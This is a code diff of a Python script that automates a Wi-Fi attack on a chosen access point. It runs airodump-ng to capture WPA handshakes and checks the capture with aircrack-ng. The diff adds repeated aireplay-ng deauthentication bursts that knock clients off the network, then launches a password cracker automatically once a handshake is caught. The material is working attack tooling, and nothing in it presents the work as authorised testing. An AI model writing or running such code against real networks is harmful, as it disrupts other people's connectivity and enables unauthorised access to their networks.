@@ -14,6 +14,9 @@ print(f"[bold green]{figlet_format('CAPTURE')}[/bold green]")
 CHECK_INTERVAL_SECONDS = 5
 MAX_CAPTURE_SECONDS = 300
 
+DEAUTH_PACKET_COUNT = 5
+DEAUTH_INTERVAL_SECONDS = 15
+
 
 def clean_folder_name(name):
     name = name.strip()
@@ -39,12 +42,6 @@ def get_unique_folder(folder_path):
 
 
 # ===================== HANDSHAKE CHECK START =====================
-# This checks the .cap file using aircrack-ng.
-# It uses the same style as your manual successful command:
-#
-# aircrack-ng captures/Redwood4/capture-01.cap
-#
-# If aircrack-ng shows WPA (1 handshake), this returns True.
 
 def has_handshake(cap_file, target_bssid):
     if not os.path.exists(cap_file):
@@ -55,10 +52,7 @@ def has_handshake(cap_file, target_bssid):
 
     try:
         result = subprocess.run(
-            [
-                "aircrack-ng",
-                cap_file
-            ],
+            ["aircrack-ng", cap_file],
             capture_output=True,
             text=True,
             timeout=15
@@ -82,144 +76,165 @@ def has_handshake(cap_file, target_bssid):
 # ====================== HANDSHAKE CHECK END ======================
 
 
-# ===================== AUTO TARGET DATA START =====================
-# main.py sends:
-# python3 capture.py BSSID CHANNEL INTERFACE SSID
+# ===================== DEAUTH START =====================
 
-if len(sys.argv) >= 5:
-    target_bssid = sys.argv[1]
-    channel = sys.argv[2]
-    interface = sys.argv[3]
-    target_name = sys.argv[4]
-else:
-    target_bssid = input("Target BSSID: ").strip()
-    channel = input("Channel: ").strip()
-    interface = input("Monitor Interface: ").strip()
-    target_name = input("Target Name: ").strip()
+def send_deauth_burst(target_bssid, interface, deauth_log_file):
+    print(
+        f"[yellow]Sending deauth burst:[/yellow] "
+        f"{DEAUTH_PACKET_COUNT} packets"
+    )
 
-# ====================== AUTO TARGET DATA END ======================
+    with open(deauth_log_file, "a") as log_file:
+        try:
+            subprocess.run(
+                [
+                    "sudo", "-n", "aireplay-ng",
+                    "--deauth", str(DEAUTH_PACKET_COUNT),
+                    "-a", target_bssid,
+                    interface
+                ],
+                stdin=subprocess.DEVNULL,
+                stdout=log_file,
+                stderr=log_file,
+                timeout=20
+            )
 
+        except subprocess.TimeoutExpired:
+            print("[red]Deauth command timed out.[/red]")
 
-print(f"[green]Target Name:[/green] {target_name}")
-print(f"[green]Target BSSID:[/green] {target_bssid}")
-print(f"[green]Channel:[/green] {channel}")
-print(f"[green]Monitor Interface:[/green] {interface}")
+        except FileNotFoundError:
+            print("[red]aireplay-ng not found. Install aircrack-ng tools.[/red]")
 
-
-# ===================== CAPTURE FOLDER SETUP START =====================
-# Creates:
-#
-# captures/
-# ├── Redwood/
-# ├── Redwood1/
-# └── Redwood2/
-
-safe_target_name = clean_folder_name(target_name)
-
-base_capture_folder = os.path.join("captures", safe_target_name)
-capture_folder = get_unique_folder(base_capture_folder)
-
-os.makedirs(capture_folder, exist_ok=True)
-
-capture_name = os.path.join(capture_folder, "capture")
-cap_file = f"{capture_name}-01.cap"
-error_file = os.path.join(capture_folder, "error.log")
-
-# ====================== CAPTURE FOLDER SETUP END ======================
+# ====================== DEAUTH END ======================
 
 
-print(f"[green]Capture Folder:[/green] {capture_folder}")
+# === ADDED: wrapped everything into run_capture() so main.py can call it
+#            directly and receive a True/False result back. ===
+def run_capture(target_bssid, channel, interface, target_name):
+    """
+    Runs the full handshake capture + deauth flow.
 
-print("\n[cyan]Starting handshake capture...[/cyan]")
-print("[yellow]Waiting for WPA handshake automatically...[/yellow]")
-print("[yellow]Press CTRL+C if you want to cancel.[/yellow]\n")
+    Returns True  if a handshake was captured and cracker was launched.
+    Returns False if capture timed out or was cancelled with no handshake.
+    """
 
-subprocess.run(["sudo", "-v"], check=True)
+    print(f"[green]Target Name:[/green] {target_name}")
+    print(f"[green]Target BSSID:[/green] {target_bssid}")
+    print(f"[green]Channel:[/green] {channel}")
+    print(f"[green]Monitor Interface:[/green] {interface}")
 
-error_output = open(error_file, "w")
+    # ── Capture folder setup ──────────────────────────────────
+    safe_target_name = clean_folder_name(target_name)
+    base_capture_folder = os.path.join("captures", safe_target_name)
+    capture_folder = get_unique_folder(base_capture_folder)
+    os.makedirs(capture_folder, exist_ok=True)
 
-capture_process = subprocess.Popen(
-    [
-        "sudo",
-        "-n",
-        "airodump-ng",
-        "--bssid",
-        target_bssid,
-        "-c",
-        channel,
-        "--write",
-        capture_name,
-        interface
-    ],
-    stdin=subprocess.DEVNULL,
-    stdout=subprocess.DEVNULL,
-    stderr=error_output,
-    preexec_fn=os.setsid
-)
+    capture_name   = os.path.join(capture_folder, "capture")
+    cap_file       = f"{capture_name}-01.cap"
+    error_file     = os.path.join(capture_folder, "error.log")
+    deauth_log_file = os.path.join(capture_folder, "deauth.log")
+
+    print(f"[green]Capture Folder:[/green] {capture_folder}")
+    print("\n[cyan]Starting handshake capture with deauth...[/cyan]")
+    print("[yellow]Capture starts first, then small deauth bursts are sent automatically.[/yellow]")
+    print("[yellow]Press CTRL+C if you want to cancel.[/yellow]\n")
+
+    subprocess.run(["sudo", "-v"], check=True)
+
+    error_output = open(error_file, "w")
+
+    capture_process = subprocess.Popen(
+        [
+            "sudo", "-n", "airodump-ng",
+            "--bssid", target_bssid,
+            "-c", channel,
+            "--write", capture_name,
+            interface
+        ],
+        stdin=subprocess.DEVNULL,
+        stdout=subprocess.DEVNULL,
+        stderr=error_output,
+        preexec_fn=os.setsid
+    )
+
+    # ── Deauth + handshake wait loop ──────────────────────────
+    handshake_found = False
+    start_time = time.time()
+    last_deauth_time = 0
+
+    time.sleep(2)
+
+    try:
+        while True:
+            elapsed = int(time.time() - start_time)
+            print(f"[cyan]Checking for handshake...[/cyan] {elapsed}s elapsed")
+
+            if has_handshake(cap_file, target_bssid):
+                handshake_found = True
+                print("\n[bold green]Handshake captured![/bold green]")
+                break
+
+            if elapsed - last_deauth_time >= DEAUTH_INTERVAL_SECONDS:
+                send_deauth_burst(target_bssid, interface, deauth_log_file)
+                last_deauth_time = elapsed
+
+            if MAX_CAPTURE_SECONDS != 0 and elapsed >= MAX_CAPTURE_SECONDS:
+                print("\n[red]No handshake captured within the time limit.[/red]")
+                break
+
+            time.sleep(CHECK_INTERVAL_SECONDS)
+
+    except KeyboardInterrupt:
+        print("\n[yellow]Capture cancelled by user.[/yellow]")
+
+    # ── Stop capture process ──────────────────────────────────
+    print("\n[cyan]Stopping capture...[/cyan]\n")
+
+    try:
+        os.killpg(os.getpgid(capture_process.pid), signal.SIGINT)
+        capture_process.wait(timeout=5)
+    except subprocess.TimeoutExpired:
+        capture_process.terminate()
+        capture_process.wait()
+
+    error_output.close()
+
+    print("[green]Capture stopped.[/green]")
+    print(f"[yellow]Files saved in:[/yellow] {capture_folder}")
+
+    if os.path.exists(error_file) and os.path.getsize(error_file) > 0:
+        print(f"[yellow]If capture failed, check:[/yellow] {error_file}")
+
+    if os.path.exists(deauth_log_file) and os.path.getsize(deauth_log_file) > 0:
+        print(f"[yellow]Deauth log saved at:[/yellow] {deauth_log_file}")
+
+    # ── Launch cracker if handshake was found ─────────────────
+    if handshake_found and os.path.exists(cap_file):
+        print("\n[cyan]Launching cracker.py automatically...[/cyan]\n")
+        subprocess.run(["python3", "cracker.py", cap_file, target_bssid, target_name])
+    else:
+        print("[yellow]Cracker not started because no handshake was detected.[/yellow]")
+
+    return handshake_found  # === CHANGED: True if handshake found, False if not ===
+# === END ADDED ===
 
 
-# ===================== AUTO HANDSHAKE WAIT START =====================
-# Instead of waiting for ENTER, this keeps checking the .cap file.
-# Once a handshake is found, it stops capture and continues to cracker.py.
+# ===================== STANDALONE MODE START =====================
+# This block only runs when capture.py is launched directly
+# (e.g. python3 capture.py ...) — not when imported by main.py.
 
-handshake_found = False
-start_time = time.time()
+if __name__ == "__main__":
+    if len(sys.argv) >= 5:
+        _bssid     = sys.argv[1]
+        _channel   = sys.argv[2]
+        _interface = sys.argv[3]
+        _name      = sys.argv[4]
+    else:
+        _bssid     = input("Target BSSID: ").strip()
+        _channel   = input("Channel: ").strip()
+        _interface = input("Monitor Interface: ").strip()
+        _name      = input("Target Name: ").strip()
 
-try:
-    while True:
-        elapsed = int(time.time() - start_time)
+    run_capture(_bssid, _channel, _interface, _name)
 
-        print(f"[cyan]Checking for handshake...[/cyan] {elapsed}s elapsed")
-
-        if has_handshake(cap_file, target_bssid):
-            handshake_found = True
-            print("\n[bold green]Handshake captured![/bold green]")
-            break
-
-        if MAX_CAPTURE_SECONDS != 0 and elapsed >= MAX_CAPTURE_SECONDS:
-            print("\n[red]No handshake captured within the time limit.[/red]")
-            break
-
-        time.sleep(CHECK_INTERVAL_SECONDS)
-
-except KeyboardInterrupt:
-    print("\n[yellow]Capture cancelled by user.[/yellow]")
-
-# ====================== AUTO HANDSHAKE WAIT END ======================
-
-
-print("\n[cyan]Stopping capture...[/cyan]\n")
-
-try:
-    os.killpg(os.getpgid(capture_process.pid), signal.SIGINT)
-    capture_process.wait(timeout=5)
-except subprocess.TimeoutExpired:
-    capture_process.terminate()
-    capture_process.wait()
-
-error_output.close()
-
-print("[green]Capture stopped.[/green]")
-print(f"[yellow]Files saved in:[/yellow] {capture_folder}")
-
-if os.path.exists(error_file) and os.path.getsize(error_file) > 0:
-    print(f"[yellow]If something failed, check:[/yellow] {error_file}")
-
-
-# ===================== AUTO CRACK START =====================
-# Only start cracking if handshake was actually detected.
-
-if handshake_found and os.path.exists(cap_file):
-    print("\n[cyan]Launching cracker.py automatically...[/cyan]\n")
-
-    subprocess.run([
-        "python3",
-        "cracker.py",
-        cap_file,
-        target_bssid,
-        target_name
-    ])
-else:
-    print("[yellow]Cracker not started because no handshake was detected.[/yellow]")
-
-# ====================== AUTO CRACK END ======================
+# ====================== STANDALONE MODE END ======================
